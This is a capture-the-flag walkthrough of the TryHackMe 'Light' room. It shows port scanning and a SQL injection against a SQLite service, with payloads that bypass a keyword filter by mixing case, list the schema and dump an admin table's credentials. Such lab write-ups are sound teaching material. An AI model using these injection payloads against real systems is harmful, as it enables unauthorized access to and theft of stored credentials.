# Light Walkthrough
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/lightroom) on TryHackMe.

Here is the **story** context:

"I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on **port 1337**. You can connect to it using `nc MACHINE_IP 1337`  
You can use the username `smokey` in order to get started."

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let't Begin

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP light.thm " | sudo tee -a /etc/hosts
```

Scan for open ports:
```bash
rustscan -a light.thm  --ulimit 5000 -- -sV -sC
```

It finds port 22 and the provided 1337.

As per the intro, we connect to the application:
```bash
nc light.thm 1337
```

We get a welcome to the Light database and we are required to supply an username.
We use the username "smokey" and receive the message: `Password: vYQ5ngPpw8AdUmL`
 
If we try with a random string we get the error "Username not found."
Let's also try to send characters to see if we get any other interesting error `'`, this shows:
```
Error: unrecognized token: "''' LIMIT 30"
```

This means that the application is retrieving data from some type of SQL based database.
We can now test for SQLi, sending ` 'or1=1; -- -` got me another verbose error:
```
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

So we find out that there is some filtering of our input, other tests also shows that keywords like `select` are forbidden but i was able to bypass that simply changing the capitalization like: `SelEct`.
Probably the filter evaluate the input string for an exact match of a list of forbidden keywords.

We also do not have any info about which of the SQL database is so i tempted to identify it following PortSwiggers examples [here](https://portswigger.net/web-security/sql-injection/examining-the-database)
But all 3 failed with errors like:
```
Error: no such table: v$version
Error: no such column: v$version
Error: no such function: version
```

Also we find that like `SELECT` also `UNION` is forbidden but can be easily bypassed like the previous one.

But this are only for MySQL, Oracle and PostgreSQL, there are more than those, so i searched for the command to get the version of the DB for others.
After testing another couple of them i got a version number with:
```sql
'unIOn SelEct sqlite_version()'
```

Via the message `Password: 3.31.1`, this means that we are inside a SQLite3 database.

Now let's find out the databases inside:
```sql
'unIOn SelEct (SelEct  group_concat(name, ', ') fRom pragma_database_list)'
```

We get 1 database called "main", now we wanna list the tables inside:
```sql
'unIOn SelEct group_concat(sql) fRom sqlite_master'
```

This prints:
```sql
 CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

We are interested in the "admintable", let's dump the content:
```sql
'unIOn SelEct group_concat(username, password) fRom admintable'
```

This successfully prints us the flag:
--> REDACTED_FLAG

The output was looking bad and the password got cut our, so we can either fix the previous query to print better the content or simply re run it asking only for the password:
```sql
'unIOn SelEct group_concat(password) fRom admintable'
```
--> REDACTED_PASSWORD

<br/>
<br/>

## Conclusion
Congratulations you have successfully exploited the SQL Injection vulnerability to get some sensitive data.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
